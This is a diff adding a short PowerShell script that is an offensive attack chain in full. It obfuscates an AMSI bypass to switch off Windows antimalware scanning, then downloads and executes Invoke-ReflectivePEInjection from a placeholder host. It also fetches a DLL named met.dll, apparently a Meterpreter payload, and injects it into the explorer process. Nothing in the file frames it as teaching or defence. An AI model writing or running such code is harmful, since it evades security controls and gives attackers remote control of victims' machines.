@@ -1,0 +1,9 @@
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
+
+(New-Object System.Net.WebClient).DownloadString("http://{ip}/tools/ps1/Invoke-ReflectivePEInjection.ps1") | IEX 
+
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://{ip}/out/dll/met.dll')
+
+$procid = (Get-Process -Name explorer).Id
+
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
